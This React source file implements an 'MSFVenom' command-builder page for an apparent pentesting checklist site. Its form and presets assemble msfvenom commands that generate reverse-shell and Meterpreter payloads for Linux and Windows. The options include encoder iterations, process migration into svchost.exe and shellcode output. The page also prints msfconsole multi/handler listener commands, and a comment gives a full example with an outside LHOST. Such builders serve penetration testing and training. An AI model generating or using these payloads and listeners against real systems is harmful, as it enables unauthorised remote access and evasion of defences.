import React, { useEffect, useState } from 'react';
import { Input, Typography, Row, Divider, Select, Form, Col, Collapse, Button, Switch, message } from 'antd';
import Clipboard from 'react-clipboard.js';
import { ClearOutlined, CopyOutlined } from '@ant-design/icons';
import PersistedState from 'use-persisted-state';
import { MSFBuilder } from '../types/MSFBuilder';
import '../../i18n';
import { useTranslation } from 'react-i18next';
const { Title, Paragraph } = Typography;

// Enum Payloads: msfvenom --list payloads | grep "/" | grep -oP '^[\s]+[a-zA-Z0-9_/]+' | awk '{print $1}' | jq -R -s -c 'split("\n") | map(select(length > 0)) | map({value: .})' > Payloads.json

//http://localhost:3000/ComLines/MSFVenom#Payload=windows%2Fx64%2Fshell_reverse_tcp&Arch=x64&Format=exe&Outfile=rev.exe&PrependSetuid=1&PrependMigrate=1&CMD=calc.exe&PrependMigrateProc=svchost.exe&BadCharacters=%5Cx00&Platform=windows&Encoder=x86%2Fshikata_ga_nai&LPORT=9090&LHOST=1.2.3.4&customParams=AutoSystemInfo%3Dtrue+HttpServerName%3DNginx&NOP=100&EncoderIterations=5

const MSFVenom = () => {
    // LocalStorage stuff
    const { t } = useTranslation();
    // Antd stuff
    const { Option } = Select;
    const { Panel } = Collapse;
    const { Text } = Typography;
    let payloads = require('../../static/data/Payloads.json');
    let encoder = require('../../static/data/Encoder.json');
    let platform = require('../../static/data/Platform.json');
    let format = require('../../static/data/Format.json');

    const msfVenomBuilder = PersistedState<MSFBuilder>('msfVenomBuilder');
    const [values, setValues] = msfVenomBuilder({
        Payload: '',
        LHOST: '',
        LPORT: '',
        Encoder: '',
        EncoderIterations: '',
        Platform: '',
        Arch: '',
        NOP: '',
        BadCharacters: '',
        Format: '',
        Outfile: '',
        PrependSetuid: false,
        PrependMigrate: false,
        PrependMigrateProc: '',
        CMD: '',
        customParams: '',
    });

    const toPayloadCopy = () => {
        if (values.Payload.length !== 0) {
            message.success(t('revshell_copied'));
        }
    }
    useEffect(() => {
        const params = new URLSearchParams(window.location.hash.substring(1));
        const Payload = params.get("Payload") || "";
        const LHOST = params.get("LHOST") || "";
        const LPORT = params.get("LPORT") || "";
        const Encoder = params.get("Encoder") || "";
        const EncoderIterations = params.get("EncoderIterations") || "";
        const Platform = params.get("Platform") || "";
        const Arch = params.get("Arch") || "";
        const NOP = params.get("NOP") || "";
        const BadCharacters = params.get("BadCharacters") || "";
        const Format = params.get("Format") || "";
        const Outfile = params.get("Outfile") || "";
        const PrependSetuid = params.get("PrependSetuid") === "1" || false;
        const PrependMigrate = params.get("PrependMigrate") === "1" || false;
        const PrependMigrateProc = params.get("PrependMigrateProc") || "";
        const CMD = params.get("CMD") || "";
        const customParams = params.get("customParams") || "";
        setValues((prevValues) => ({
            ...prevValues,
            Payload: Payload,
            LHOST: LHOST,
            LPORT: LPORT,
            Encoder: Encoder,
            EncoderIterations: EncoderIterations,
            Platform: Platform,
            Arch: Arch,
            NOP: NOP,
            BadCharacters: BadCharacters,
            Format: Format,
            Outfile: Outfile,
            PrependSetuid: PrependSetuid,
            PrependMigrate: PrependMigrate,
            PrependMigrateProc: PrependMigrateProc,
            CMD: CMD,
            customParams: customParams,
        }));
    }, []);

    const { LHOST, LPORT, Platform, Arch, NOP, Encoder,
        EncoderIterations, BadCharacters, Format, Outfile, PrependSetuid, PrependMigrate, PrependMigrateProc, CMD, customParams } = values;

    const launchCommand = `msfconsole -qx "use exploit/multi/handler; set PAYLOAD ${values.Payload}; set LHOST ${values.LHOST}; set LPORT ${values.LPORT}; run"`;

    const handleChangeTemplate = (value) => {
        let updatedValues = { ...values };
        const params = new URLSearchParams(window.location.hash.substring(1));
        switch (value) {
            case 'Linux x64 Reverse Shell elf':
                updatedValues = {
                    ...updatedValues,
                    Payload: 'linux/x64/shell_reverse_tcp',
                    Arch: 'x64',
                    Format: 'elf',
                    Outfile: 'rev'
                    // 设置其他参数的默认值或者清空其他参数
                };
                break;
            case 'Linux x64 Meterpreter elf':
                updatedValues = {
                    ...updatedValues,
                    Payload: 'linux/x64/meterpreter_reverse_https',
                    Arch: 'x64',
                    Format: 'elf',
                    Outfile: 'meter'
                    // 设置其他参数的默认值或者清空其他参数
                };
                break;
            case 'Windows x64 Reverse Shell exe':
                updatedValues = {
                    ...updatedValues,
                    Payload: 'windows/x64/shell_reverse_tcp',
                    Arch: 'x64',
                    Format: 'exe',
                    Outfile: 'rev.exe'
                    // 设置其他参数的默认值或者清空其他参数
                };
                break;
            case 'Windows x64 Reverse Shell ps-cmd':
                updatedValues = {
                    ...updatedValues,
                    Payload: 'windows/x64/shell_reverse_tcp',
                    Arch: 'x64',
                    Format: 'psh-cmd',
                    Outfile: 'rev.txt'
                    // 设置其他参数的默认值或者清空其他参数
                };
                break;
            case 'Windows x64 Meterpreter exe':
                updatedValues = {
                    ...updatedValues,
                    Payload: 'windows/x64/meterpreter_reverse_https',
                    Arch: 'x64',
                    Format: 'exe',
                    Outfile: 'meter.exe'
                    // 设置其他参数的默认值或者清空其他参数
                };
                break;
            case 'Linux CMD Line ShellCode':
                updatedValues = {
                    ...updatedValues,
                    Payload: 'linux/x86/exec',
                    Arch: 'x86',
                    Format: 'c',
                    Outfile: 'shellcode.c',
                    CMD: '/bin/sh'
                    // 设置其他参数的默认值或者清空其他参数
                };
                break;
            case 'Windows CMD Line ShellCode 64':
                updatedValues = {
                    ...updatedValues,
                    Payload: 'windows/x64/exec',
                    Arch: 'x64',
                    Format: 'c',
                    Outfile: 'shellcode.c',
                    CMD: 'calc'
                    // 设置其他参数的默认值或者清空其他参数
                };
                break;
            default:
                // 默认情况下可以清空或者设置其他参数的默认值
                updatedValues = {
                    ...updatedValues,
                    Payload: '',
                    Arch: '',
                    Format: '',
                    Outfile: '',
                    // 设置其他参数的默认值或者清空其他参数
                };
                break;
        }
        if (updatedValues.Payload.length !== 0) { params.set("Payload", updatedValues.Payload); } else { params.delete("Payload"); }
        if (updatedValues.Arch.length !== 0) { params.set("Arch", updatedValues.Arch); } else { params.delete("Arch"); }
        if (updatedValues.Format.length !== 0) { params.set("Format", updatedValues.Format); } else { params.delete("Format"); }
        if (updatedValues.Outfile.length !== 0) { params.set("Outfile", updatedValues.Outfile); } else { params.delete("Outfile"); }
        if (PrependSetuid) { params.set("PrependSetuid", "1"); } else { params.delete("PrependSetuid"); }
        if (PrependMigrate) { params.set("PrependMigrate", "1"); } else { params.delete("PrependMigrate"); }
        if (updatedValues.CMD.length !== 0) { params.set("CMD", updatedValues.CMD); } else { params.delete("CMD"); }
        if (updatedValues.customParams.length !== 0) { params.set("customParams", updatedValues.customParams); } else { params.delete("customParams"); }
        window.location.hash = '#' + params.toString();
        setValues(updatedValues);
        setTemplate(value) // 可用于清空所选项
    };

    const handleChange = (name: string) => (event: { target: { value: string } }) => {
        setValues({ ...values, [name]: event.target.value });
        const params = new URLSearchParams(window.location.hash.substring(1));
        // 把设置的参数填进hashroute，没设置的空参数就删掉
        if (event.target.value && typeof event.target.value !== 'undefined' && event.target.value.length !== 0) {
            params.set(name, event.target.value);
        } else { params.delete(name) }
        window.location.hash = '#' + params.toString();
    };

    const handleChangeSelect = (prop: string) => (data: any) => {
        setValues({ ...values, [prop]: data });
        const params = new URLSearchParams(window.location.hash.substring(1));
        // 把设置的参数填进hashroute，没设置的空参数就删掉
        if (data && typeof data !== 'undefined' && data.length !== 0) { params.set(prop, data); } else { params.delete(prop) }
        window.location.hash = '#' + params.toString();
    };

    const generateCommand = (values) => {
        const options = [
            LHOST && `LHOST=${LHOST}`,
            LPORT && `LPORT=${LPORT}`,
            PrependSetuid && `PrependSetuid=True`,
            PrependMigrate && `PrependMigrate=True`,
            PrependMigrateProc && PrependMigrateProc.length > 0 && PrependMigrate && `PrependMigrateProc=${PrependMigrateProc}`,
            customParams && `${customParams}`,
            CMD && `CMD=${CMD}`,
            Platform && `--platform ${Platform}`,
            Arch && `-a ${Arch}`,
            NOP && `-n ${NOP}`,
            Encoder && `-e ${Encoder}`,
            EncoderIterations && `-i ${EncoderIterations}`,
            BadCharacters && `-b "${BadCharacters}"`,
            Format && `-f ${Format}`,
            Outfile && `-o ${Outfile}`,
        ].filter(Boolean);


        if (!values.Payload) {
            return '';
        }

        const command = `msfvenom -p ${values.Payload} ${options.join(' ')}`;
        return command;
    }
    const rawText = t('msfvenom_desc',);
    const paragraphs = rawText.split('<br />');

    const [templateName, setTemplate] = useState('');

    const handleClear = () => {
        setValues((prevValues) => ({
            ...prevValues,
            Payload: '',
            LHOST: '',
            LPORT: '',
            Encoder: '',
            EncoderIterations: '',
            Platform: '',
            Arch: '',
            NOP: '',
            BadCharacters: '',
            Format: '',
            Outfile: '',
            PrependSetuid: false,
            PrependMigrate: false,
            PrependMigrateProc: '',
            CMD: '',
            customParams: ''
        }));
        window.location.hash = '';
        setTemplate('');
    };

    const handlePrependSetuidChange = (checked: boolean) => {
        const params = new URLSearchParams(window.location.hash.substring(1));
        let check_num = ""
        if (checked) {
            check_num = "1"
            params.set("PrependSetuid", check_num);
        } else {
            params.delete("PrependSetuid");
        }
        setValues({ ...values, PrependSetuid: checked });
        window.location.hash = '#' + params.toString();
    };

    const handlePrependMigrateChange = (checked: boolean) => {
        const params = new URLSearchParams(window.location.hash.substring(1));
        let check_num = ""
        if (checked) {
            check_num = "1"
            params.set("PrependMigrate", check_num);
        } else {
            params.delete("PrependMigrate");
        }
        setValues({ ...values, PrependMigrate: checked });
        window.location.hash = '#' + params.toString();
    };
    document.title = `${t('msfvenom_title')} - HackTrick Checklist`;
    return (
        <div>
            <div style={{ margin: 15 }}>
                <Title level={2} style={{ fontWeight: 'bold' }}>
                    {t('msfvenom_title')}
                </Title>
                <Paragraph>
                    <div>
                        {paragraphs.map((paragraph, index) => (
                            <Paragraph key={index}>
                                {paragraph}
                            </Paragraph>
                        ))}
                    </div>
                </Paragraph>
            </div>
            <Divider />
            <div
                key='a'
                style={{
                    marginTop: 15,
                    marginLeft: 15
                }}
            >
                <Row gutter={{ xs: 8, sm: 16, md: 24, lg: 32 }}>
                    <Col span={8}>
                        <Form.Item
                            name='template'
                            label='Template'
                            valuePropName="values"
                        >
                            <Select
                                //onChange={handleChangeTemplate}
                                onSelect={handleChangeTemplate}
                                placeholder='None'
                                value={templateName || undefined}
                                options={[
                                    {
                                        label: 'None',
                                        options: [
                                            { label: 'None', value: 'None' }
                                        ],
                                    },
                                    {
                                        label: 'Linux / macOS',
                                        options: [
                                            { label: 'Rev_Shell _64 (elf)', value: 'Linux x64 Reverse Shell elf' },
                                            { label: 'Meterpreter_64 (elf)', value: 'Linux x64 Meterpreter elf' },
                                            { label: 'CMD Line (ShellCode)', value: 'Linux CMD Line ShellCode' },
                                        ],
                                    },
                                    {
                                        label: 'Windows',
                                        options: [
                                            { label: 'Rev_Shell _64 (exe)', value: 'Windows x64 Reverse Shell exe' },
                                            { label: 'Rev_Shell _64 (cmd)', value: 'Windows x64 Reverse Shell ps-cmd' },
                                            { label: 'Meterpreter_64 (exe)', value: 'Windows x64 Meterpreter exe' },
                                            { label: 'CMD Line (x64 ShellCode)', value: 'Windows CMD Line ShellCode 64' },
                                        ],
                                    },
                                ]}>
                            </Select>
                        </Form.Item>
                    </Col>
                    <Col span={12}>
                        <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                            <Clipboard component='a' data-clipboard-text={generateCommand(values)}>
                                <Button
                                type='primary'
                                onClick={toPayloadCopy}
                                disabled={!values.Payload || (values.Payload.length === 0)}
                                >
                                    <CopyOutlined /> {t('misc_copy')}
                                </Button>
                            </Clipboard>
                            <Button
                                danger
                                onClick={handleClear}
                            >
                                <ClearOutlined /> {t('misc_clear')}
                            </Button>
                        </div>
                    </Col>
                </Row>
            </div>
            <Divider style={{ margin: 8 }} />
            <div
                key='a'
                style={{
                    marginTop: 15,
                    marginLeft: 15
                }}
            >
                <Form>
                    <Row gutter={{ xs: 8, sm: 16, md: 24, lg: 32 }}>
                        <Col span={10}>
                            <Form.Item
                                name='payload'
                                valuePropName="values"
                                required
                                label='Payload'
                            >
                                <Select
                                    showSearch
                                    options={payloads}
                                    value={values.Payload || undefined}
                                    allowClear
                                    onChange={handleChangeSelect('Payload')}
                                    placeholder='python/meterpreter/reverse_http'
                                    filterOption={(inputValue, option) =>
                                        option.value.toString().toUpperCase().indexOf(inputValue.toUpperCase()) !== -1
                                    }
                                >
                                    {payloads.map(
                                        (
                                            data: {
                                                value:
                                                | boolean
                                                | React.ReactFragment
                                                | React.ReactPortal
                                                | null
                                                | undefined;
                                            },
                                            key: string | number
                                        ) => {
                                            return <Option value={key}>{data.value}</Option>;
                                        }
                                    )}
                                </Select>
                            </Form.Item>
                        </Col>
                        <Col span={6}>
                            <Form.Item
                                valuePropName="values"
                                name='architecture'
                                label='Arch(-a)'
                            >
                                <Select
                                    //showSearch
                                    value={values.Arch || undefined}
                                    onChange={handleChangeSelect('Arch')}
                                    placeholder='x86'
                                    allowClear
                                >
                                    <Option value={'x64'}>x64</Option>
                                    <Option value={'x86'}>x86</Option>
                                </Select>
                            </Form.Item>
                        </Col>
                        <Col span={8}>
                            <Form.Item
                                valuePropName="values"
                                name='format'
                                label='Format(-f)'
                            >
                                <Select
                                    showSearch
                                    options={format}
                                    value={values.Format || undefined}
                                    onChange={handleChangeSelect('Format')}
                                    placeholder='powershell'
                                    allowClear
                                    filterOption={(inputValue, option: any) =>
                                        option.value.toUpperCase().indexOf(inputValue.toUpperCase()) !== -1}
                                >
                                    {format.map(
                                        (
                                            data: {
                                                value:
                                                | boolean
                                                | React.ReactFragment
                                                | React.ReactPortal
                                                | null
                                                | undefined;
                                            },
                                            key: string | number
                                        ) => {
                                            return <Option value={key}>{data.value}</Option>;
                                        }
                                    )}
                                </Select>
                            </Form.Item>
                        </Col>
                    </Row>
                    <Row gutter={{ xs: 8, sm: 16, md: 24, lg: 32 }}>
                        <Col span={8}>
                            <Form.Item
                                required name='ip_address'
                                valuePropName="values"
                                label='LHOST'
                            >
                                <Input
                                    value={values.LHOST || undefined}
                                    onChange={handleChange('LHOST')}
                                    allowClear
                                    placeholder='IP Address or domain (ex: 212.212.111.222)'
                                />
                            </Form.Item>
                        </Col>
                        <Col span={8}>
                            <Form.Item
                                required name='port'
                                valuePropName="values"
                                label='LPORT'
                            >
                                <Input
                                    value={values.LPORT}
                                    // type="number"
                                    onChange={handleChange('LPORT')}
                                    maxLength={5}
                                    allowClear
                                    placeholder='Port (ex: 1337)'
                                />
                            </Form.Item>
                        </Col>
                        <Col span={8}>
                            <Form.Item
                                valuePropName="values"
                                name='outfile'
                                label='Output(-o)'
                            >
                                <Input
                                    value={values.Outfile}
                                    onChange={handleChange('Outfile')}
                                    placeholder='reverse_shell'
                                    allowClear
                                />
                            </Form.Item>
                        </Col>
                    </Row>
                </Form>
                <Collapse>
                    <Panel header={t('msfvenom_show_adv')} key="1">
                        <Form>
                            <Row gutter={{ xs: 8, sm: 16, md: 24, lg: 32 }}>
                                <Col span={12}>
                                    <Form.Item
                                        name='encoder'
                                        valuePropName="values"
                                        label='Encoder(-e)'
                                    >
                                        <Select
                                            showSearch
                                            options={encoder}
                                            value={values.Encoder || undefined}
                                            onChange={handleChangeSelect('Encoder')}
                                            placeholder='x86/shikata_ga_nai'
                                            allowClear
                                            filterOption={(inputValue, option: any) =>
                                                option.value.toUpperCase().indexOf(inputValue.toUpperCase()) !== -1}
                                        >
                                            {encoder.map(
                                                (
                                                    data: {
                                                        value:
                                                        | boolean
                                                        | React.ReactFragment
                                                        | React.ReactPortal
                                                        | null
                                                        | undefined;
                                                    },
                                                    key: string | number
                                                ) => {
                                                    return <Option value={key}>{data.value}</Option>;
                                                }
                                            )}
                                        </Select>
                                    </Form.Item>
                                </Col>
                                <Col span={12}>
                                    <Form.Item
                                        valuePropName="values"
                                        name='platform'
                                        label='--platform'
                                    >
                                        <Select
                                            showSearch
                                            options={platform}
                                            value={values.Platform || undefined}
                                            onChange={handleChangeSelect('Platform')}
                                            placeholder='Windows'
                                            allowClear
                                            filterOption={(inputValue, option: any) =>
                                                option.value.toUpperCase().indexOf(inputValue.toUpperCase()) !== -1}
                                        >
                                            {platform.map(
                                                (
                                                    data: {
                                                        value: boolean | React.ReactFragment | React.ReactPortal;
                                                    },
                                                    key: string | number
                                                ) => {
                                                    return <Option value={key}>{data.value}</Option>;
                                                }
                                            )}
                                        </Select>
                                    </Form.Item>
                                </Col>
                            </Row>
                            <Row gutter={{ xs: 8, sm: 16, md: 24, lg: 32 }}>
                                <Col span={6}>
                                    <Form.Item
                                        name='iteration'
                                        valuePropName="values"
                                        label='Iterations(-i)'
                                    >
                                        <Input
                                            value={values.EncoderIterations}
                                            // type="number"
                                            onChange={handleChange('EncoderIterations')}
                                            placeholder='4'
                                            allowClear
                                        />
                                    </Form.Item>
                                </Col>
                                <Col span={6}>
                                    <Form.Item
                                        name='nop'
                                        valuePropName="values"
                                        label="Nop's(-n)"
                                    >
                                        <Input
                                            value={values.NOP}
                                            // type="number"
                                            allowClear
                                            onChange={handleChange('NOP')}
                                            maxLength={5}
                                            placeholder='200'
                                        />
                                    </Form.Item>
                                </Col>
                                <Col span={12}>
                                    <Form.Item
                                        name='badchar'
                                        valuePropName="values"
                                        label='BadChar(-b)'
                                    >
                                        <Input
                                            value={values.BadCharacters}
                                            onChange={handleChange('BadCharacters')}
                                            placeholder='\x00\x0a\x0d'
                                            allowClear
                                        />
                                    </Form.Item>
                                </Col>
                            </Row>
                            <Row gutter={{ xs: 8, sm: 16, md: 24, lg: 32 }}>
                                <Col span={6}>
                                    <Form.Item
                                        name='PrependSetuid'
                                        label='PrependSetuid' //PrependSetuid=True
                                    >
                                        <Switch
                                            checked={values.PrependSetuid}
                                            onChange={handlePrependSetuidChange}
                                            checkedChildren="True"
                                            unCheckedChildren="False"
                                        />
                                    </Form.Item>
                                </Col>
                            </Row>
                            <Row gutter={{ xs: 8, sm: 16, md: 24, lg: 32 }}>
                                <Col span={6}>
                                    <Form.Item
                                        name='PrependMigrate'
                                        label="PrependMigrate" //PrependMigrate=true PrependMigrateProc=svchost.exe
                                    >
                                        <Switch
                                            checked={values.PrependMigrate}
                                            onChange={handlePrependMigrateChange}
                                            checkedChildren="True"
                                            unCheckedChildren="False"
                                        />
                                    </Form.Item>
                                </Col>
                                <Col span={10}>
                                    <Form.Item
                                        name='PrependMigrateProc'
                                        valuePropName="values"
                                        label="PrependMigrateProc" //PrependMigrate=true PrependMigrateProc=svchost.exe
                                    >
                                        <Input
                                            placeholder='svchost.exe'
                                            allowClear
                                            value={values.PrependMigrateProc}
                                            onChange={handleChange('PrependMigrateProc')}
                                        />
                                    </Form.Item>
                                </Col>
                                <Col span={8}>
                                    <Form.Item
                                        name='CMD'
                                        valuePropName="values"
                                        label="CMD" //CMD=calc
                                    >
                                        <Input
                                            placeholder='calc.exe'
                                            allowClear
                                            value={values.CMD}
                                            onChange={handleChange('CMD')}
                                        />
                                    </Form.Item>
                                </Col>
                            </Row>
                            <Row gutter={{ xs: 8, sm: 16, md: 24, lg: 32 }}>
                                <Col span={24}>
                                    <Form.Item
                                        name='customParams'
                                        valuePropName="values"
                                        label={t('msfvenom_customParams')} // Any params u want
                                    >
                                        <Input
                                            placeholder='AutoSystemInfo=true NullFreeVersion=true'
                                            allowClear
                                            value={values.customParams}
                                            onChange={handleChange('customParams')}
                                        />
                                    </Form.Item>
                                </Col>
                            </Row>
                        </Form>
                    </Panel>
                </Collapse>
                <Divider />
                <Paragraph>
                    {t('msfvenom_cmd1')}
                </Paragraph>
                <Paragraph>
                    <pre>
                        <Text copyable>
                            {generateCommand(values)}
                        </Text>
                    </pre>
                </Paragraph>
                <Paragraph>
                    {t('msfvenom_cmd2')}
                </Paragraph>
                <Paragraph>
                    <pre>
                        <Text copyable>{launchCommand}</Text>
                    </pre>
                </Paragraph>
                <Paragraph>
                    {t('msfvenom_cmd3')}
                </Paragraph>
                <Paragraph>
                    <pre>
                        <Text copyable>
                            {`use exploit/multi/handler\nset PAYLOAD ${values.Payload}\nset LHOST ${values.LHOST}\nset LPORT ${values.LPORT}\nrun`}
                        </Text>
                    </pre>
                </Paragraph>
            </div>
        </div>
    );
};

export default MSFVenom;
